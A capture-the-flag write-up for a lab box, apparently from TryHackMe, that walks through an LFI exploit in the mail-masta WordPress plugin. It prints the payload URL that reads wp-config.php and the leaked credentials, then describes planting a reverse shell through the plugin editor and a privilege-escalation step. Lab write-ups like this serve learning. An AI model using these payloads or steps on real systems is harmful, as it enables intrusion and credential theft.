# All in One

### All in One
Nmap scan shows ports 21,22 and 80 open. Port is a default apache webserver. `/wordpress` contains a wordpress website. WP scan `wpscan --url http://10.10.17.128/wordpress --enumerate p,t,u` shows the presence of a pluging called `mail masta`.
This version is vulnerable to [local file inclusion](https://www.exploit-db.com/exploits/40290). <br />
I want to exploit it to read the `wp-config.php` file, which should contain passwords for users. To read it with the LFI, my payload is `http://10.10.17.128/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php`.<br />
This returns a base64 encoded string. If I decode it with cyberchef, i get: <br />

      ....SNIP
      
      /** MySQL database username */
      define( 'DB_USER', 'elyana' );
      
      /** MySQL database password */
      define( 'DB_PASSWORD', 'H@ckme@123' );
      
      /** MySQL hostname */
      define( 'DB_HOST', 'localhost' );
      
      /** Database Charset to use in creating database tables. */
      define( 'DB_CHARSET', 'utf8mb4' );
      
      ...SNIP

I now have access to the dashboard. Go on `plugins -> plugin editor`. Put the php pentest monkey reverse shell inside `askimet.php`.
![image](https://github.com/user-attachments/assets/d5652aea-1efe-422d-afd8-69658f736a15)<br />
Now open a netcat listener and visit `http://10.10.17.128/wordpress/wp-content/plugins/akismet/akismet.php` and spawn the reverse shell!
Now, for privesc: I need to become the user `elyana`. I find a hint in the home directory:<br />
![image](https://github.com/user-attachments/assets/4c8f837c-bf09-4843-a425-b170450590a5)<br />
I run linpeas to be quicker and I get this: <br />
![image](https://github.com/user-attachments/assets/7b0c7736-3ba9-4fc5-886c-666e8ba202f9)<br />
I'll do the easiest way: just run `chmod 777 /root/root.txt` and `chmod 777 /home/elyana/user.txt` and get both the flags! (Remember to first base64 decode them)

